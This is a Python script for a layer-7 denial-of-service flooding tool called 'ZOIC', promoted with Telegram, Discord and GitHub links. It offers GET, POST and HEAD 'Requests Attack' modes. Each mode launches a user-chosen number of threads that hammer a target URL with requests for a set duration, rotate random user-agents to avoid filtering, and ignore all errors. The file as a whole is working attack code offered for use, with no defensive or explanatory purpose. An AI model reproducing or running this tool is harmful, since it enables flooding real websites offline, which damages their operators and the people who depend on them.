import threading
import datetime
import threading
import requests
import os
import random
import time

useragent = open("ua.txt").read().splitlines()

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
          {zoic}
                     ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗            
                     ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                     ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
                    github.com/cybermads
           {zoic}╔═══════════════════════════════════{clear}
           {zoic}║{clear}  {zoic}-{clear} get     {zoic}|{clear} GET Requests Attack         
           {zoic}║{clear}  {zoic}-{clear} post    {zoic}|{clear} POST Requests Attack 
           {zoic}║{clear}  {zoic}-{clear} head    {zoic}|{clear} HEAD Requests Attack 
           {zoic}╚═══════════════════════════════════{clear}

""")              
    
def layer7():
    while True:
        banner()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
         
        if select.startswith("get"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}get{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def get(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=get, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {zoic}╔══════════════════════════════════{clear}
      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}GET Requests{zoic}]{clear} 
      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
      {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("post"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}post{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def post(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.post(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=post, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {zoic}╔══════════════════════════════════{clear}
      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}POST Requests{zoic}]{clear} 
      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
      {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("head"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}post{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def head(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.head(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=head, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {zoic}╔══════════════════════════════════{clear}
      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}HEAD Requests{zoic}]{clear}   
      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
      {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)


if __name__ == "__main__":
    layer7()





